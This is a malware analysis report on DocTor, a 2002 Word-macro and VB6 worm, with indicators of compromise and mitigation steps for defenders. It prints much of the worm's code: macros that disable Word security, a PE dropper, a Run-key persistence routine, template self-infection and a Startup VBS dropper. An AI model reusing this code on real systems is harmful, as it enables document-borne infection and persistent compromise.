# 🛡️ Malware Analysis Report: VB.DocTor.Worm (DocTor)

![Analysis Date](https://img.shields.io/badge/analysis_date-2025--11--06-blue)
![Malware Type](https://img.shields.io/badge/type-Hybrid%20Macro%20%2B%20Win32%20Worm-red)
![Creation Date](https://img.shields.io/badge/created-2002--06--22-orange)

## Overview

DocTor is a hybrid worm composed of:
- A Microsoft Word macro (stored in the document class `ThisDocument`) that disables Office protection, infects the Normal template and active document, and drops a Win32 executable.
- A companion VB6 executable (`Doctor.exe`) that persists via HKLM Run, writes a Startup VBS for macro re‑infection, generates a macro source file with an embedded hex PE payload, and attempts Outlook mass‑mailing when launched with a specific flag.

Artifacts in this folder:
- `DocTor.cls` — Word macro (class `ThisDocument`)
- `modoctor.bas` — VB6 module for the Win32 component
- `DocTor.ex_` — packed binary sample
- `DocTor.vbp` / `DocTor.vbw` — VB6 project
- `doctor.ico` — icon; `Doctor.lnk` — sample shortcut
- `Form1.frm` / `Form1.frx` — auxiliary VB6 form
- `screenshot.png` — UI capture
- Vendor reports: `Symantec Security Response - W97M.Dotor.A@mm.pdf` and `W32.Dotor.A@mm.pdf`

> Disclaimer: Historical malware analysis for research/education. Do not execute outside a lawful, isolated lab environment.

## Execution chain at a glance

1) A Word document with the DocTor macro is opened → `Document_Open` executes, lowers macro security, drops `%WINDIR%\Doctor.exe`, sets an HKLM Run value, and infects both `Normal.dot` and the active document.
2) On reboot or next run, `%WINDIR%\Doctor.exe` starts (optionally with the `/newrun` flag) → installs itself, writes a Startup VBS (`doctor.vbs`) that re‑imports the macro into Word, and generates a temporary macro source file containing the executable’s hex to be decoded back into `Doctor.exe` on victim systems. With `/newrun`, it attempts Outlook mass‑mailing.

---

## Word macro (DocTor.cls → `ThisDocument`)

Key parts of `Document_Open`:

```vb
Private Sub Document_Open()
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")

' Huge hex-encoded PE in variable pef ...

Set doc = ActiveDocument.VBProject.VBComponents(1)
Set nor = NormalTemplate.VBProject.VBComponents(1)
With Options
  .ConfirmConversions = False
  .VirusProtection = False
  .SaveNormalPrompt = False
End With
Select Case Application.Version
Case "10.0"
  System.PrivateProfileString "", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level" = 1&
  System.PrivateProfileString "", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM" = 1&
Case "9.0"
  System.PrivateProfileString "", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level" = 1&
End Select
WordBasic.DisableAutoMacros 0

If nor.Name <> "DocTor" Then
  read = dec(pef)
  Set r = fso.CreateTextFile(fso.GetSpecialFolder(0) & "\Doctor.exe", 2)
  r.Write read: r.Close
  ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DocTor", fso.GetSpecialFolder(0) & "\Doctor.exe /newrun"
  install doc, nor
End If
If doc.Name <> "DocTor" Then
  install nor, doc
  ActiveDocument.Save
End If
End Sub
```

- Security bypass: disables prompts and sets Word security `Level=1`, enables `AccessVBOM`, and enables auto‑macros.
- Dropper: decodes the hex `pef` into `%WINDIR%\Doctor.exe` and sets HKLM Run.
- Macro propagation: copies code between Normal template and active doc using `install src,dst`.

Helper routines:

```vb
Private Sub install(src, dst)
  Set odst = dst.CodeModule
  Set osrc = src.CodeModule
  odst.DeleteLines 1, odst.CountOfLines
  odst.InsertLines 1, osrc.Lines(1, osrc.CountOfLines)
End Sub

Function dec(octe)
  For hexad = 1 To Len(octe) Step 2
    dec = dec & Chr("&h" & Mid(octe, hexad, 2))
  Next
End Function
```

---

## Win32 component (VB6) — `modoctor.bas`

### Entry point and modes

```vb
Sub Main()
On Error Resume Next
org = App.Path & "\" & App.EXEName & ".exe"
If InStr(1, GetCommLine, "/newrun") = 0 Then
  docv = "C:\" & <8 random lowercase letters> & ".txt"
  Install
  DocVir
  VbsDrop
Else
  Sleep 20000
  DeleteFile GetSpecialfolder(CSIDL_STARTUP) & "\doctor.vbs"
  ' wait for Internet then try Outlook mass-mailing ...
End If
End Sub
```

- Normal mode: prepares macro payload and Startup VBS.
- `/newrun` mode: waits 20s, cleans the Startup VBS, then attempts to mass‑mail (buggy—see below).

### Persistence

```vb
Sub Install()
org = App.Path & "\" & App.EXEName & ".exe"
cop = fso.GetSpecialfolder(0) & "\Doctor.exe"
FileCopy org, cop
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DocTor", cop & " /newrun"
End Sub
```

### Macro source generator (DocVir)

Reads its own PE, hex‑encodes it, and writes a macro source file that can reconstruct the EXE and re‑infect Word:

```vb
Open orig For Binary As #1
Do While Not EOF(1)
  Get #1, , bbyte
  e = Hex(bbyte): If Len(e) = 1 Then e = "0" & Hex(bbyte)
  pefile = pefile & e
Loop: Close #1

hexf = "pef = """ : For i = 1 To Len(pefile) Step 110
  hexf = hexf & Mid(pefile, i, 110) & """" & vbCrLf & "pef = pef & """
Next: hexf = hexf & """" & vbCrLf

inst = "read = dec(pef)" & vbCrLf & _
       "Set r = fso.CreateTextFile(fso.GetSpecialFolder(0) & ""\Doctor.exe"", 2)" & vbCrLf & _
       "r.Write read: r.Close" & vbCrLf & _
       "ws.RegWrite ""HKLM\...\Run\DocTor"", fso.GetSpecialFolder(0) & ""\Doctor.exe /newrun"""
```

It then emits the full `Document_Open` macro, the same `install` and `dec` routines, into the temp file `docv` for later import by the VBS dropper.

### Startup VBS dropper (VbsDrop)

Creates `%APPDATA%\...\Startup\doctor.vbs` that automates Word to import the macro and lower security:

```vb
vbs = "On Error Resume Next" & vbCrLf & _
      "Set wrd=createObject(""Word.Application"")" & vbCrLf & _
      "wrd.options.virusprotection=0" & vbCrLf & _
      "ws.regwrite ""HKCU\Software\Microsoft\Office\10.0\Word\Security\Level"",1,""REG_DWORD""" & vbCrLf & _
      "ws.regwrite ""HKCU\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM"",1,""REG_DWORD""" & vbCrLf & _
      "If wrd.normaltemplate.vbproject.vbcomponents(1).name <> ""DocTor"" Then" & vbCrLf & _
      "  wrd.normaltemplate.vbproject.vbcomponents(1).codemodule.addfromfile(""" & docv & """)" & vbCrLf & _
      "  wrd.normaltemplate.vbproject.vbcomponents(1).name=""DocTor""" & vbCrLf & _
      "End If" & vbCrLf & _
      "wscript.sleep 500" & vbCrLf & _
      "fso.deletefile """ & docv & """" & vbCrLf & _
      "wrd.application.quit"
```

This ensures the macro is planted even if the initial document isn’t opened again.

### Mass‑mailing block (bugs present)

When run with `/newrun`, the code attempts to send mail to Outlook address lists; however, it includes typical errors seen in similar samples:

- Compares an object to the string `"Outlook"` (`If out = "Outlook" Then`).
- Uses `ml.Recipients.Add` instead of `mel.Recipients.Add`.
- Attaches an `orig` variable not defined in that scope.

As written, many deployments would fail to mail successfully.

---

## Indicators of Compromise (IoCs)

- Files/directories:
  - `%WINDIR%\Doctor.exe`
  - Startup: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\doctor.vbs`
  - Temporary macro source: `C:\<8 lowercase>.txt`
- Word artifacts:
  - `Normal.dot` VBComponents(1) named `DocTor` and infected active documents
  - Word security lowered (AccessVBOM enabled; Level=1)
- Registry:
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DocTor = "<windir>\Doctor.exe /newrun"`
- Email/Outlook:
  - Attempted subjects like "NewTool for Word Macro Virus" with `DocTor.exe`

## Mitigation

1. Remove Run key `HKLM\...\Run\DocTor` and delete `%WINDIR%\Doctor.exe`.
2. Delete `%APPDATA%\...\Startup\doctor.vbs` and any `C:\<random>.txt` temp files.
3. Restore Word security settings; disable `AccessVBOM`; re‑enable macro warnings.
4. Clean `Normal.dot` and affected documents (remove `DocTor` module).
5. Monitor and block COM automation of Word/Outlook from untrusted processes.
6. Use endpoint protection that detects VBA project manipulation and script‑generated PE drops.

## Notes

- The Word macro embeds a full PE image as hex within `DocTor.cls`, decoded on victim systems — a classic self‑extracting tactic.
- The presence of Symantec PDFs suggests this family was known as both a macro worm variant (W97M.Dotor.A@mm) and a Win32 mailer (W32.Dotor.A@mm).
- Implementation errors in the mailer reduce spread but do not mitigate local persistence or macro infection.

— Analysis based on `DocTor.cls` (ThisDocument) and `modoctor.bas` (VB6), June 22, 2002.
